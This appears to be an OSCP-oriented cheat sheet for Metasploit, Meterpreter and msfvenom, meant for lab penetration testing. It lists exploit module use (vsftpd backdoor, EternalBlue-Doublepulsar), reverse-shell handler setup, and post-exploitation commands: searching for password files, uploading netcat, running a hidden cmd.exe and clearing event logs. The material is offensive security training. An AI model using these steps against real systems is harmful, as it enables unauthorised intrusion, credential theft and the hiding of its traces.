# Metasploit/Meterpreter/MSFvenum

Metasploit is a penetration testing platform that enables you to find, exploit, and validate vulnerabilities. It provides the infrastructure, content, and tools to perform penetration tests and extensive security auditing and thanks to the open source community and Rapid7’s own hard working content team, new modules are added on a regular basis, which means that the latest exploit is available to you as soon as it’s published.

[https://www.offensive-security.com/metasploit-unleashed/](https://www.offensive-security.com/metasploit-unleashed/)

#### Starting

`systemctl enable postgresql`To enable Postgresql on startup

`msfconsole` Start metasploit

`?` for available commands. Look at Database Backend Commands.

`db_status` shows if Metasploit is connected to postgres.

Connecting to the database: [https://www.offensive-security.com/metasploit-unleashed/using-databases/](https://www.offensive-security.com/metasploit-unleashed/using-databases/)

`msfdb run` = command to start database and msfconsole all in one command

#### Host scanning

`db_nmap` Executes nmap and records the output automatically

`Hosts` for list of hosts after map scan

#### Exploit search

**help search or search -h  like type:exploit or platform:windows**

`search vsftpd` or `search cve:2007-2447` for samba user map\_script

you can also do a `searchsploit vsftpd` from the Metasploit command line

example Microsoft vunerability search `search ms08-067`

`grep vnc search type:exploit` You can also use grep to filter the metasploit search

#### Use exploit

`use exploit/unix/ftp/vsftpd_234_backdoor`

`info` description about the exploit and vunerablitity or `show options`

`set RHOST 10.10.10.78`

`run or exploit`

`exit or back back`

#### Payload

`search payload or show payloads`

> If you launch a show payloads command when using an exploit, you will only see the payloads that work with the selected exploit.

`set payload windows/shell/reverse_tcp` or `set payload windows/meterpreter/reverse_tcp`

`show options` to show the payload options

[https://www.exploit-db.com/docs/english/26000-windows-meterpreterless-post-exploitation.pdf](https://www.exploit-db.com/docs/english/26000-windows-meterpreterless-post-exploitation.pdf)

## Metasploit Scanner

With Metasploit you can also do scans on ports and services like

`auxiliary/scanner/ftp/ftp_login`

`auxiliary/scanner/smb/smb_version`

look under modules/auxiliary/scanner for the different options

## Meterpreter

Meterpreter is an advanced, dynamically extensible **payload** that uses **in-memory** DLL injection [stagers](https://www.offensive-security.com/metasploit-unleashed/payloads/) and is extended over the network at runtime. It communicates over the stager socket and provides a comprehensive client-side Ruby API. It features command history, tab completion, channels, and more.

[https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)

`background` put a session to the background so you can start another or go back to msfconsole

`sessions -i 1` to resume background session 1

`sessions -l` show active sessions

`jobs` to show current running jobs

`jobs -k 0` stop the job with ID=0, but let the meterpreter session running

`sysinfo` to learn the machine better, `ifconfig` for network configuration, `route` for routing information

`getuid` and `getpid` for user- and process ID you are attached to.

`ps` shows processen on target machine to see what programs are running and the location of the files

`run scraper` for an automated list with information about the attacked system or `run winenum`

You have to use `cd C:\\` for navigating with a double backslash

You can use `upload` and `download` files by using these commands

`shell` for a standard operating system shell

`execute -f cmd.exe -i H` to run the command prompt, interactive and hidden from the client

`search` for searching the target machine, `edit` is used to edit the file

`run post/ <tab><tab>` to see a list of the available meterpreter scripts to run

#### Cleanup

`clearev`command to clean up at the end of your session on the target machine

## Client-side Exploitation

With client side exploitation it requires the client to take some action like opening en email or clinking a link. You have to set up a listener with Metasploit. This waits for the reverse shell from the malware/payload backdoor. You can create a payload with msfpayload, msfvenomen or the Veil framework

`msf > use exploit/multi/handler`

`msf exploit(handler) > set payload windows/meterpreter/reverse_tcp`

## MSFvenum

Metasploit standalone payload generator. [https://www.offensive-security.com/metasploit-unleashed/msfvenom/](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)

### Generating payloads with msfvenom <a id="fa7e"></a>

If you’re not already familiar with msfvenom, it’s an absolute must for OSCP. Msfvenom is part of the Metasploit Framework, and is used to generate payloads which do all kinds of evil things, from generating reverse shells to generating message boxes for a pretty PoC.

I don’t want to cover msfvenom in detail here, because you can find it easily in other places, like the [offsec website](https://www.offensive-security.com/metasploit-unleashed/msfvenom/).

* See \[\*Metasploit Unleashed Course\*\]\([https://www.offensive-security.com/metasploit-unleashed/\](https://www.offensive-security.com/metasploit-unleashed/%29\)

  in the Essentials

* Search for exploits using Metasploit GitHub framework source code:

  \[\*[https://github.com/rapid7/metasploit-framework\*\]\(https://github.com/rapid7/metasploit-framework\](https://github.com/rapid7/metasploit-framework*]%28https://github.com/rapid7/metasploit-framework%29\)

  Translate them for use on OSCP LAB or EXAM.

* Metasploit
  * MetaSploit requires Postgresql

    \`systemctl start postgresql\`
* To enable Postgresql on startup

  \`systemctl enable postgresql\`

* MSF Syntax
  * Start metasploit

    \`msfconsole \`

    \`msfconsole -q\`
* Show help for command

  \`show -h\`

* Show Auxiliary modules

  \`show auxiliary\`

* Use a module

  use auxiliary/scanner/snmp/snmp\_enum

  use auxiliary/scanner/http/webdav\_scanner

  use auxiliary/scanner/smb/smb\_version

  use auxiliary/scanner/ftp/ftp\_login

  use exploit/windows/pop3/seattlelab\_pass\`

* Show the basic information for a module

  \`info\`

* Show the configuration parameters for a module

  \`show options\`

* Set options for a module

  \`set RHOSTS 192.168.1.1-254

  set THREADS 10\`

* Run the module

  \`run\`

* Execute an Exploit

  \`exploit\`

* Search for a module

  \`search type:auxiliary login\`

* Metasploit Database Access
  * Show all hosts discovered in the MSF database

    \`hosts\`
* Scan for hosts and store them in the MSF database

  \`db\_nmap\`

* Search machines for specific ports in MSF database

  \`services -p 443\`

* Leverage MSF database to scan SMB ports \(auto-completed rhosts\)

  \`services -p 443 --rhosts\`

* Staged and Non-staged
  * Non-staged payload - is a payload that is sent in its entirety in one go
  * Staged - sent in two parts Not have enough buffer space Or need to bypass antivirus
  * MS 17-010 - EternalBlue
* You may find some boxes that are vulnerable to MS17-010 \(AKA. EternalBlue\). Although, not offically part of the indended course, this exploit can be leveraged to gain SYSTEM level access to a Windows box. I have never had much luck using the built in Metasploit EternalBlue module. I found that the elevenpaths version works much more relabily. Here are the instructions to install it taken from the following YouTube video:

  [https://www.youtube.com/watch?v=4OHLor9VaRI](https://www.youtube.com/watch?v=4OHLor9VaRI)

* First step is to configure the Kali to work with wine 32bit

  \`dpkg --add-architecture i386 && apt-get update && apt-get install wine32

  rm -r ~/.wine

  wine cmd.exe

  exit\`

* Download the exploit repostory

  [https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit](https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit)

* Move the exploit to /usr /share /metasploit-framework /modules /exploits /windows /smb
* Start metasploit console

I found that using spoolsv.exe as the PROCESSINJECT yielded results on OSCP boxes.

```text
  \`use exploit/windows/smb/eternalblue\_doublepulsar

  msf exploit\(eternalblue\_doublepulsar\) &gt; set RHOST 10.10.10.10

  RHOST =&gt; 10.11.1.73

  msf exploit\(eternalblue\_doublepulsar\) &gt; set PROCESSINJECT spoolsv.exe

  PROCESSINJECT =&gt; spoolsv.exe

  msf exploit\(eternalblue\_doublepulsar\) &gt; run\`
```

* Experimenting with Meterpreter
  * Get system information from Meterpreter Shell

    \`sysinfo\`
* Get user id from Meterpreter Shell

  \`getuid\`

* Search for a file

  \`search -f \*pass\*.txt\`

* Upload a file

  \`upload /usr/share/windows-binaries/nc.exe c:\Users\Offsec\`

* Download a file

  \`download c:\Windows\system32\calc.exe /tmp/calc.exe\`

* Invoke a command shell from Meterpreter Shell

  \`shell\`

* Exit the meterpreter shell

  \`exit\`

* Metasploit Exploit Multi Handler
  * multi/handler to accept an incoming reverse\\_https\\_meterpreter

    \`payload

    use exploit/multi/handler

    set PAYLOAD windows/meterpreter/reverse\_https

    set LHOST $ip

    set LPORT 443

    exploit

    \[\*\] Started HTTPS reverse handler on [https://$ip:443/\`](https://$ip:443/`)
* Building Your Own MSF Module
  * \`mkdir -p ~/.msf4/modules/exploits/linux/misc

    cd ~/.msf4/modules/exploits/linux/misc

    cp

    /usr/share/metasploitframework/modules/exploits/linux/misc/gld\\_postfix.rb

    ./crossfire.rb

    nano crossfire.rb\`



